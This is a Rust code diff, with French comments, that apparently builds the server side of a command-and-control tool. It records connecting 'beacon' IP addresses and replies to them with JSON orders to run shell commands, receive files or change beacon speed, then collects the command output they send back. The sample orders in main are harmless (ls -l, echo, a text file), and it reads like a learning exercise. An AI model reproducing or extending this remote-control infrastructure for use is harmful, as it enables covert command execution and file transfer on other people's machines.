@@ -1,13 +1,26 @@
 use std::{
     fs::{OpenOptions, File},
     io::{prelude::*, BufReader},
-    net::{SocketAddr}
+    net::{SocketAddr},
 };
-use tiny_http::{Response};
 use chrono::prelude::*;
-  
-// https://doc.rust-lang.org/book/ch20-01-single-threaded.html
-// telnet 127.0.0.1 8080
+use tiny_http::{Response};
+use serde::{Serialize, Deserialize};  
+
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+enum OrdreType {
+    Commande,
+    Fichier,
+    Vitesse,
+    Autre
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+struct Ordre {
+    ordre: OrdreType,
+    arguments: Vec<String>,
+}
 
 fn write_incoming_ip(request : Option<&SocketAddr>){
     let fp = "./beacon.txt";
@@ -48,7 +61,6 @@ fn write_incoming_ip(request : Option<&SocketAddr>){
         }
     }
     if !does_exist{
-        println!("!does_exist");
         let mut file_ref = OpenOptions::new().append(true).open(fp).expect("Unable to open file"); 
         file_ref.write_all(ip.as_bytes()).expect("write failed");
         file_ref.write_all(" - active \n".as_bytes()).expect("write failed");
@@ -78,17 +90,95 @@ fn write_logs(request : Option<&SocketAddr>){
     println!("Log appended successfully"); 
 }
 
+async fn handle_post_request(server: & tiny_http::Server) -> () {
+
+    let request = server.recv();
+
+    match request {
+        Ok(mut rq) => {
+
+            if *rq.method() == tiny_http::Method::Post {
+
+                let mut content = String::new();
+                rq.as_reader().read_to_string(&mut content).unwrap();
+
+                println!("{}", content);
+            
+                let response = Response::from_string("Recu requete POST\n");
+                rq.respond(response).unwrap();
+            }
+        },
+        Err(e) => { println!("error: {}", e);  }
+    };
+}
+
+async fn handle_file_post_request(server: & tiny_http::Server, filename: &str) -> () {
+
+    let request = server.recv();
+
+    match request {
+        Ok(rq) => {
+
+            if *rq.method() == tiny_http::Method::Post {
+                
+                let file = std::fs::File::open(filename).unwrap();
+
+                let mut response = Response::from_file(file);
+                let header = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"multipart/form-data"[..]).unwrap();
+                response.add_header(header);
+                rq.respond(response).unwrap();
+            }
+        },
+        Err(e) => { println!("error: {}", e);  }
+    };
+}
+
+
+async fn send_ordre(server: & tiny_http::Server, ordre: OrdreType, arguments: Vec<String>) -> () {
+    let request = server.recv();
+    match request {
+        Ok(rq) => {
+
+            if *rq.method() == tiny_http::Method::Get {
+
+                println!("Incoming connection from: {:?} \n", rq.remote_addr());
+                write_incoming_ip(rq.remote_addr());
+                write_logs(rq.remote_addr());
+
+                let bod = Ordre { ordre: ordre.clone(), arguments: arguments.clone() };
+
+                let response = Response::from_string(serde_json::to_string(&bod).unwrap());
+                rq.respond(response).unwrap();
+
+                match ordre {
+                    OrdreType::Commande => {
+                        handle_post_request(&server).await;
+                    },
+                    OrdreType::Fichier => {
+                        let filename = arguments[0].as_str();
+                        handle_file_post_request(&server, filename).await;
+                    },
+                    _ => ()
+                }
+
+            }
+
+        },
+        Err(e) => { println!("error: {}", e);  }
+    };
+
+}
+
+
 #[tokio::main]
 async fn main() {
     let server = tiny_http::Server::http("0.0.0.0:8082").unwrap();
-    for mut request in server.incoming_requests() {
-        println!("Incoming connection from: {:?} \n", request.remote_addr());
-        write_incoming_ip(request.remote_addr());
-        write_logs(request.remote_addr());
-        let mut content = String::new();
-        request.as_reader().read_to_string(&mut content).unwrap();
-        println!("{}", content);
-        let response = Response::from_string("Response strin blabla");
-        request.respond(response).unwrap();
-    }
+    //////////////////////// Envoie une commande ls pour l'example
+    send_ordre(&server, OrdreType::Commande, vec![String::from("ls"), String::from("-l")]).await;
+    //////////////////////// envoie un echo pour l'exemple
+    send_ordre(&server, OrdreType::Commande, vec![String::from("echo"), String::from("titouan")]).await;
+    //////////////////////// envoie un fichier pour l'exemple
+    send_ordre(&server, OrdreType::Fichier, vec![String::from("texte.txt")]).await;
+
+    send_ordre(&server, OrdreType::Vitesse, vec![String::from("1")]).await;
 }
